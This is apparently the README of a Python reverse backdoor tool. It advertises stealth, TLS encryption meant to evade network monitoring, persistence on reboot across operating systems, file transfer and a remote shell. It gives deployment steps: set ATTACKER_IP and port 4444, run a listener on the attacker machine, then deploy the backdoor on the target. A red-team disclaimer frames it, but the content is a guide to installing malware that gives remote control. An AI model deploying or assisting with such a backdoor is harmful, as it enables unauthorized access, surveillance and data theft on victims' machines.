🔐 Python Backdoor Tool (SSL/TLS Encrypted)
A stealthy, cross-platform backdoor with encrypted communication (SSL/TLS), persistence mechanisms, and remote command execution. Designed for penetration testers and red teamers to simulate post-exploitation activities in authorized environments.

⚠️ Legal & Ethical Notice
This tool is for educational, authorised security testing, and research purposes only.
Unauthorised use of systems you do not own or have explicit permission to test is illegal.
The developer assumes no liability for misuse.
✨ Key Features
✅ Encrypted Communication – SSL/TLS secured to evade basic network monitoring.
✅ Persistence – Auto-starts on reboot (Windows, Linux, macOS).
✅ File Transfer – Upload/download files to/from the target.
✅ Remote Shell – Execute system commands remotely.
✅ Lightweight – No bloated dependencies, just Python 3.

🛠️ Setup & Usage
1️⃣ Prerequisites
Python 3.6+
pycryptodome (for optional AES encryption)
Install dependencies:

pip install -r requirements.txt
2️⃣ Configuration
Backdoor (reverse_backdoor.py)
Edit these values before deploying:

my_backdoor = Backdoor("ATTACKER_IP", 4444, "STRONG_PASSWORD")  # Replace!
Listener (listener.py)
Ensure the IP/password match:

my_backdoor = Backdoor("YOUR_IP", 4444, "STRONG_PASSWORD")  # Same as above!

3️⃣ Running the Tool

Start the listener (attacker machine):
python listener.py

Deploy the backdoor (target machine):\
python reverse_backdoor.py


🔧 Customization
Change Port/Password
Modify these in both files:

Backdoor("IP", PORT, "PASSWORD")  # Update IP/port/password
Disable SSL (Not Recommended)
Replace _secure_connect with a plain socket:

def _secure_connect(self, ip, port):
    return socket.create_connection((ip, port))
